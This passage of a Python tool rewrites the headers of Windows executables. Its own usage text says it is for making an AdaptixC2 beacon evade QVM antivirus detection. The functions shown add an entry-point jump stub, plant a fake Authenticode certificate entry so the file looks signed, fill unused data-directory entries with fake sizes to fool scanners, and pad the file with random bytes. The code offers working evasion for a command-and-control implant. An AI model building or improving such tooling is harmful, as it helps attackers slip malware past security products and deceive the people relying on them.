    # For now, we use the approach of finding a place to put our jmp
    # OR we just verify the EP looks reasonable and return

    # Actually, let's do a clean approach:
    # If the section has room (check VirtualSize vs SizeOfRawData gap),
    # write a jmp at the EP location, then update EP to point to the
    # original code that we don't actually move (since we can't relocate
    # without understanding the code).

    # Cleanest approach for a post-processing tool:
    # Write a short jmp stub at the END of the section (in the gap between
    # VirtualSize and alignment padding), then point EP to that stub.
    # The stub jumps to the original EP.

    # Check if there's space in the section after VirtualSize
    # SizeOfRawData may be larger than VirtualSize, giving us room
    raw_size = read_dword(data, section_off + (ep_section_idx * 40) + 16)
    file_alignment_off = locs['opt_hdr_off'] + 36
    file_alignment = read_dword(data, file_alignment_off)

    # The raw data is at ep_section_raw, size is min(virtual_size, raw_size)
    usable_raw_size = min(ep_section_size, raw_size)

    # Check if we have at least 10 bytes of padding at the end of raw data
    section_raw_end = ep_section_raw + usable_raw_size
    if section_raw_end + 10 > len(data):
        # Extend the file if needed
        needed_space = max(section_raw_end + 10 - len(data), 0)
        data.extend(b'\x00' * needed_space)

    if section_raw_end + 10 > len(data):
        return data, 0

    # Build the trampoline: jmp rel32 to original EP
    # jmp rel32 = opcode 0xE9 + 4-byte relative offset
    # The relative offset = target - (current_instruction_address + 5)
    # 
    # Our stub is at section_raw_end (file offset)
    # Its RVA = ep_section_va + (section_raw_end - ep_section_raw)
    stub_rva = ep_section_va + (section_raw_end - ep_section_raw)
    stub_file_offset = section_raw_end

    # Calculate jmp offset
    # jmp instruction at stub_rva is 5 bytes long
    # So next instruction is at stub_rva + 5
    # We want to jump to old_ep_rva
    jmp_offset = old_ep_rva - (stub_rva + 5)

    # Write the jmp instruction: 0xE9 <4-byte relative offset>
    data[stub_file_offset] = 0xE9
    struct.pack_into('<i', data, stub_file_offset + 1, jmp_offset)

    # Update the EP to point to our stub
    write_dword(data, ep_off, stub_rva)

    # Update SizeOfRawData if needed to cover the new bytes
    new_raw_size = (section_raw_end - ep_section_raw) + 5
    # Round up to file alignment
    new_raw_size = align_up(new_raw_size, file_alignment)
    write_dword(data, section_off + (ep_section_idx * 40) + 16, new_raw_size)

    print(f"[+] EP trampoline: 0x{old_ep_rva:X} -> 0x{stub_rva:X} (jmp back)")

    return data, old_ep_rva


# ─────────────────────────────────────────────────────────────
# Feature 9: Fake digital certificate directory entry
# ─────────────────────────────────────────────────────────────

def add_fake_certificate(data):
    """
    Add a fake digital certificate directory entry (IMAGE_DIRECTORY_ENTRY_SECURITY).

    The security directory entry (index 4 in the data directory) points to
    a PKCS#7 Authenticode signature. We don't add a real signature, but we
    set the data directory entry to point to valid-looking (but empty/zero) data.

    Strategy: Set the security directory RVA to a value within a section's
    gap/padding area (between raw end and virtual end), and set size to 0.
    This makes some parsers think there's a certificate but not crash when
    checking the size.

    Better: Point it to a location in header padding or section padding
    with a small size (8-16 bytes) that won't cause issues.
    """
    locs = decode_pe_locations(data)
    if locs is None:
        return data, False

    data_dir_off = locs['data_dir_off']
    num_data_dirs = locs['num_data_dirs']

    # Security directory is index 4
    if num_data_dirs < 5:
        return data, False

    sec_dir_off = data_dir_off + (4 * 8)  # Each entry is 8 bytes (RVA + Size)

    # Read current security directory
    current_rva = read_dword(data, sec_dir_off)
    current_size = read_dword(data, sec_dir_off + 4)

    # If already has a certificate, leave it (could be real)
    if current_rva != 0 and current_size > 0:
        return data, False

    # We need to find a safe location to point the certificate RVA to
    # Use the DOS stub area, which has lots of padding
    # Point it just after the DOS header but before the PE signature
    # This area typically has junk/data that won't be mapped
    
    # Use the area between DOS header end (0x40) and the Rich Header area
    # This is NOT mapped into memory, which is fine for certificate directories
    # (they reference file offsets, not RVAs... wait, no — actually the security
    # directory IS an exception: for IMAGE_DIRECTORY_ENTRY_SECURITY, the data
    # directory entry contains a file offset, NOT an RVA!)

    # The security directory is special: it uses a file pointer, not an RVA.
    # So we can point it to any safe location in the file.

    e_lfanew = locs['e_lfanew']
    # Pick a location in the DOS stub area (between 0x40 and e_lfanew)
    # with enough room for a small fake structure
    
    # We'll place our "fake cert" at a position in this area
    # and write a small dummy PKCS#7 structure header there
    
    # Find a safe offset: start of DOS stub area
    fake_cert_offset = 0x80  # After DOS header, before rich header typically
    
    # Make sure it's in range and has space
    if fake_cert_offset + 16 > e_lfanew:
        fake_cert_offset = e_lfanew - 16
    
    if fake_cert_offset < 0x40:
        fake_cert_offset = 0x40

    # Write a fake PKCS#7-like structure
    # PKCS#7 ContentInfo starts with SEQUENCE tag (0x30)
    # We write minimal valid-looking ASN.1
    
    # Minimal fake structure:
    fake_asn1 = bytes([
        0x30, 0x80,           # SEQUENCE, constructed (indefinite length)
        0x06, 0x09,           # OID
        0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x07, 0x02,  # signedData (1.2.840.113549.1.7.2)
        0xA0, 0x80,           # [0] (EXPLICIT), constructed
        0x30, 0x80,           # SEQUENCE
        0x00, 0x00,           # End-of-contents marker
    ])
    
    # Truncate if too large to fit
    max_size = min(len(fake_asn1), e_lfanew - fake_cert_offset)
    fake_asn1 = fake_asn1[:max_size]

    # Write the fake structure
    for i, b in enumerate(fake_asn1):
        data[fake_cert_offset + i] = b
    
    # Set the security directory entry
    write_dword(data, sec_dir_off, fake_cert_offset)  # File offset (not RVA!)
    write_dword(data, sec_dir_off + 4, len(fake_asn1))  # Size
    
    print(f"[+] Fake certificate directory: offset 0x{fake_cert_offset:X}, size {len(fake_asn1)} bytes")
    
    return data, True


# ─────────────────────────────────────────────────────────────
# Feature 10: Data directory table entry randomization
# ─────────────────────────────────────────────────────────────

def shuffle_data_directories(data):
    """
    Randomize data directory entries to confuse QVM's pattern matching.
    
    Strategy:
    1. Generate some fake data directory entries with plausible RVAs and sizes
    2. For entries that are 0 (empty/not used), set them to point to plausible
       locations within section padding or header padding
    3. Reorder or shift entries to break fixed-position assumptions
    
    Note: We cannot actually reorder the data directory because the indices
    are positional. However, we CAN:
    - Fill in empty entries with fake data
    - Randomize the sizes of existing entries
    - Add entries beyond index 15 if NumberOfRvaAndSizes allows
    
    For safety, we only modify entries that are currently 0 (unused).
    """
    locs = decode_pe_locations(data)
    if locs is None:
        return data, 0

    data_dir_off = locs['data_dir_off']
    num_data_dirs = locs['num_data_dirs']

    # Ensure we have at least 16 entries
    if num_data_dirs < 16:
        write_dword(data, locs['num_rva_and_sizes_off'], 16)
        # Extend the data (headers area should have room, but just in case)
        num_data_dirs = 16

    # Data directory indices we should NOT touch (important for functionality):
    # 0 = EXPORT (may be used)
    # 1 = IMPORT (critical for loading)
    # 2 = RESOURCE (may have real data)
    # 3 = EXCEPTION (may have real data)
    # 4 = SECURITY (handled by fake_cert)
    # 5 = BASERELOC (critical for ASLR)
    # 6 = DEBUG (may have real data)
    # 7 = ARCHITECTURE (usually 0)
    # 8 = GLOBALPTR (usually 0)
    # 9 = TLS (may have real data)
    # 10 = LOAD_CONFIG (may have real data)
    # 11 = BOUND_IMPORT (usually 0)
    # 12 = IAT (may be used)
    # 13 = DELAY_IMPORT (usually 0)
    # 14 = COM_DESCRIPTOR (usually 0 for non-.NET)
    # 15 = RESERVED (always 0)

    # Indices that are safe to fake when empty:
    # 7, 8, 11, 13, 14, 15
    safe_indices = [7, 8, 11, 13, 14, 15]

    # Find a section with writable data to point fake entries at
    # Use the DOS stub area (file offsets, since many directory entries
    # point to data that exists in memory - but we'll use RVA 0 with small size
    # to avoid actual crashes)
    
    # Better approach: use RVA 0 (null) but with non-zero sizes for safe indices
    # This makes some parser tools think the entry exists without crashing the loader
    
    # Even better: point to padding within the .data or .rdata section
    # Find a section with initialiazed data
    section_off = locs['section_off']
    target_rva = 0
    target_section = -1

    for i in range(locs['num_sections']):
        sh_off = section_off + (i * 40)
        sec_va = read_dword(data, sh_off + 12)
        sec_size = read_dword(data, sh_off + 8)
        sec_char = read_dword(data, sh_off + 36)
        sec_name = data[sh_off:sh_off + 8].split(b'\x00')[0].decode('ascii', errors='replace')
        
        # Prefer .rdata or .data sections
        if sec_name in ('.rdata', '.data', '.text', '.pdata'):
            # Point to the middle/end of the section where there might be padding
            target_rva = sec_va + (sec_size - 0x10) if sec_size > 0x20 else sec_va + 8
            target_section = i
            break

    modified = 0
    for idx in safe_indices:
        if idx >= num_data_dirs:
            continue

        dir_off = data_dir_off + (idx * 8)
        current_rva = read_dword(data, dir_off)
        current_size = read_dword(data, dir_off + 4)

        # Only modify if currently empty
        if current_rva == 0 and current_size == 0:
            if target_section != -1 and target_rva > 0:
                # Set a plausible but insignificant RVA and size
                # Use RVA 0 with a small size for maximum safety
                # The loader won't try to parse entries with size == 0
                write_dword(data, dir_off, 0)
                
                # Give it a fake non-zero size to fool static analysis
                fake_size = random.choice([0x08, 0x10, 0x20, 0x40])
                write_dword(data, dir_off + 4, fake_size)
            else:
                # Use RVA=0, size = 0 — leave as-is
                pass

            modified += 1

    # For indices 11 (BOUND_IMPORT), 13 (DELAY_IMPORT), we can also
    # set to non-zero if the current value is 0
    
    # Additional trick: For indices that are zero, randomly set the size
    # to a small non-zero value even if RVA stays 0 (fools some scanners)
    for idx in range(16):
        if idx in safe_indices:
            continue  # Already handled above
        dir_off = data_dir_off + (idx * 8)
        current_rva = read_dword(data, dir_off)
        current_size = read_dword(data, dir_off + 4)
        
        if current_rva == 0 and current_size == 0 and random.random() < 0.5:
            # Add a fake size for a zero RVA — fools basic parsers
            write_dword(data, dir_off + 4, random.choice([0x08, 0x10, 0x18, 0x20, 0x30]))
            modified += 1

    print(f"[+] Modified {modified} data directory entries")

    return data, modified


# ─────────────────────────────────────────────────────────────
# Section padding (preserved from original, enhanced)
# ─────────────────────────────────────────────────────────────

def add_section_padding(data):
    """Add garbage padding between sections."""
    locs = decode_pe_locations(data)
    if locs is None:
        return data, 0

    num_sections = locs['num_sections']
    section_off = locs['section_off']

    if num_sections == 0:
        return data, 0

    # Pointer to last section header
    last_sh = section_off + ((num_sections - 1) * 40)

    # Read the last section header's PointerToRawData and SizeOfRawData
    ptr_raw = read_dword(data, last_sh + 20)
    size_raw = read_dword(data, last_sh + 16)

    if ptr_raw == 0 or size_raw == 0:
        return data, 0

    end_of_data = ptr_raw + size_raw

    garbage_size = random.randint(32, 128)
    garbage_size = (garbage_size + 3) & ~3

    garbage = bytes([random.randint(0, 255) for _ in range(garbage_size)])
    new_data = data[:end_of_data] + garbage + data[end_of_data:]

    return new_data, garbage_size


# ─────────────────────────────────────────────────────────────
# Main entry point
# ─────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description='PE Header Modification for AdaptixC2 beacon — QVM evasion enhanced edition',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s input.exe output.exe --all
  %(prog)s input.exe --subsystem 3 --add-fake-sections --normalize
  %(prog)s input.exe --shuffle-dirs --fake-cert --ep-trampoline
        """
    )
    parser.add_argument('input', nargs='?', help='Input PE binary')
    parser.add_argument('output', nargs='?', help='Output PE binary (default: modify in-place)')
    parser.add_argument('--subsystem', type=str, default=None,
                        choices=['2', '3', 'random'],
                        help='Target subsystem (2=gui, 3=console, random=auto)')
    parser.add_argument('--add-fake-sections', action='store_true', default=True,
                        help='Add empty .rsrc, .reloc, .tls sections')
    parser.add_argument('--no-fake-sections', action='store_true',
                        help='Disable fake section injection')
    parser.add_argument('--no-rename-sections', action='store_true',
                        help='Disable section name randomization (recommended: random names on a multi-section mingw binary are an anomaly)')
    parser.add_argument('--normalize', action='store_true', default=True,
                        help='Normalize optional header fields')
    parser.add_argument('--no-normalize', action='store_true',
                        help='Disable header normalization')
    parser.add_argument('--ep-trampoline', action='store_true', default=True,
                        help='Add entry point trampoline')
    parser.add_argument('--no-ep-trampoline', action='store_true',
                        help='Disable EP trampoline')
    parser.add_argument('--fake-cert', action='store_true', default=True,
                        help='Add fake digital certificate directory entry')
    parser.add_argument('--no-fake-cert', action='store_true',
                        help='Disable fake certificate')
    parser.add_argument('--shuffle-dirs', action='store_true', default=True,
                        help='Shuffle/reorder data directory entries')
    parser.add_argument('--no-shuffle-dirs', action='store_true',
                        help='Disable data directory shuffling')
    parser.add_argument('--checksum', action='store_true', default=True,
                        help='Write PE checksum')
    parser.add_argument('--no-checksum', action='store_true',
                        help='Disable checksum writing')

    # Parse known args to handle both old and new usage
    args, unknown = parser.parse_known_args()

    # Support old-style usage: <input> [output]
    if not args.input and sys.argv[1:]:
        # First positional that isn't a flag
        for arg in sys.argv[1:]:
            if not arg.startswith('--'):
                if args.input is None:
                    args.input = arg
                elif args.output is None:
                    args.output = arg
                break

    if not args.input:
        print(f"Usage: {sys.argv[0]} <input_binary> [output_binary]")
        print(f"       {sys.argv[0]} <input_binary> -o <output_binary> [options]")
        sys.exit(1)

    input_path = args.input
    output_path = args.output if args.output else input_path

    # Resolve feature toggles
    do_fake_sections = args.add_fake_sections and not args.no_fake_sections
    do_rename_sections = not args.no_rename_sections
    do_normalize = args.normalize and not args.no_normalize
    do_ep_trampoline = args.ep_trampoline and not args.no_ep_trampoline
    do_fake_cert = args.fake_cert and not args.no_fake_cert
    do_shuffle_dirs = args.shuffle_dirs and not args.no_shuffle_dirs
    do_checksum = args.checksum and not args.no_checksum

    # Parse subsystem argument
    subsystem_target = None
    if args.subsystem == '2':
        subsystem_target = 2
    elif args.subsystem == '3':
        subsystem_target = 3
    elif args.subsystem == 'random':
        subsystem_target = None  # random choice in randomize_subsystem

    # Read the binary
    with open(input_path, 'rb') as f:
        data = bytearray(f.read())

    print(f"{'='*60}")
    print(f"PE Header Modifier — Enhanced Edition")
    print(f"{'='*60}")
    print(f"[*] Input:  {input_path}")
    print(f"[*] Size:   {len(data)} bytes")
    print(f"[*] Output: {output_path}")
    print(f"{'='*60}")

    changes_applied = 0

    # 1. Randomize timestamp
    data, old_ts = modify_timestamp(data)
    if old_ts:
        locs = decode_pe_locations(data)
        if locs:
            new_ts = read_dword(data, locs['file_hdr_off'] + 4)
            print(f"[1/10] [+] TimeDateStamp: {old_ts} -> {new_ts}")
            changes_applied += 1
    else:
        print(f"[1/10] [!] TimeDateStamp: not modified (not a valid PE?)")

    # 2. Rename sections
    if do_rename_sections:
        data, renamed = modify_section_names(data)
    else:
        renamed = 0
    if renamed:
        print(f"[2/10] [+] Section names: {renamed} sections renamed")
        changes_applied += 1
    else:
        print(f"[2/10] [-] Section names: none renamed")

    # 3. Inject valid Rich Header
    data, rich_injected = inject_valid_rich_header(data)
    if rich_injected:
        print(f"[3/10] [+] Rich Header: valid MSVC-style header injected")
        changes_applied += 1
    else:
        print(f"[3/10] [-] Rich Header: skipped (no room / not enough header slack)")

    # 4. Checksum calculation
    if do_checksum:
        data, checksum_written = write_checksum(data)
        if checksum_written:
            locs = decode_pe_locations(data)
            if locs:
                cs = read_dword(data, locs['checksum_off'])
                print(f"[4/10] [+] Checksum: written (0x{cs:08X})")
                changes_applied += 1
        else:
            print(f"[4/10] [!] Checksum: not written (header too small?)")
    else:
        print(f"[4/10] [-] Checksum: skipped")

    # 5. Fake sections
    if do_fake_sections:
        data, fake_count = add_fake_sections(data)
        if fake_count:
            print(f"[5/10] [+] Fake sections: {fake_count} added")
            changes_applied += 1
        else:
            print(f"[5/10] [-] Fake sections: none added (all target sections already exist)")
    else:
        print(f"[5/10] [-] Fake sections: skipped")

    # 6. Subsystem randomization
    data, old_subsystem = randomize_subsystem(data, subsystem_target)
    if old_subsystem:
        locs = decode_pe_locations(data)
        if locs:
            new_subsystem = read_word(data, locs['subsystem_off'])
            subsys_names = {0: "UNKNOWN", 1: "NATIVE", 2: "GUI", 3: "CONSOLE"}
            old_name = subsys_names.get(old_subsystem, f"0x{old_subsystem:X}")
            new_name = subsys_names.get(new_subsystem, f"0x{new_subsystem:X}")
            print(f"[6/10] [+] Subsystem: {old_name} ({old_subsystem}) -> {new_name} ({new_subsystem})")
            changes_applied += 1
    else:
        print(f"[6/10] [!] Subsystem: not modified")

    # 7. Normalize optional header
    if do_normalize:
        data, normalized = normalize_optional_header(data)
        if normalized:
            print(f"[7/10] [+] Optional header: normalized")
            changes_applied += 1
        else:
            print(f"[7/10] [!] Optional header: normalization skipped")
    else:
        print(f"[7/10] [-] Optional header: normalization skipped")

    # 8. EP trampoline
    if do_ep_trampoline:
        data, old_ep = add_ep_trampoline(data)
        if old_ep:
            locs = decode_pe_locations(data)
            if locs:
                new_ep = read_dword(data, locs['ep_offset'])
                print(f"[8/10] [+] EP trampoline: 0x{old_ep:X} -> 0x{new_ep:X}")
                changes_applied += 1
        else:
            print(f"[8/10] [!] EP trampoline: not added (no suitable section)")
    else:
        print(f"[8/10] [-] EP trampoline: skipped")

    # 9. Fake certificate
    if do_fake_cert:
        data, cert_added = add_fake_certificate(data)
        if cert_added:
            locs = decode_pe_locations(data)
            if locs:
                sec_dir_off = locs['data_dir_off'] + (4 * 8)
                cert_rva = read_dword(data, sec_dir_off)
                cert_size = read_dword(data, sec_dir_off + 4)
                print(f"[9/10] [+] Fake cert: dir entry (offset 0x{cert_rva:X}, size {cert_size})")
                changes_applied += 1
        else:
            print(f"[9/10] [-] Fake cert: not added (already has real cert entry)")
    else:
        print(f"[9/10] [-] Fake cert: skipped")

    # 10. Shuffle data directories
    if do_shuffle_dirs:
        data, shuffled = shuffle_data_directories(data)
        if shuffled:
            print(f"[10/10] [+] Data directories: {shuffled} entries modified")
            changes_applied += 1
        else:
            print(f"[10/10] [-] Data directories: none modified")
    else:
        print(f"[10/10] [-] Data directories: skipped")

    # Recalculate checksum after all modifications if enabled
    if do_checksum:
        data, _ = write_checksum(data)
        locs = decode_pe_locations(data)
        if locs:
            cs = read_dword(data, locs['checksum_off'])
            print(f"[*] Final checksum: 0x{cs:08X}")

    print(f"{'='*60}")
    print(f"[*] Summary: {changes_applied}/10 modifications applied")
    print(f"[*] Final size: {len(data)} bytes")
    print(f"{'='*60}")

    # Write output
    with open(output_path, 'wb') as f:
        f.write(data)

    print(f"[*] Written to: {output_path}")


if __name__ == '__main__':
    main()
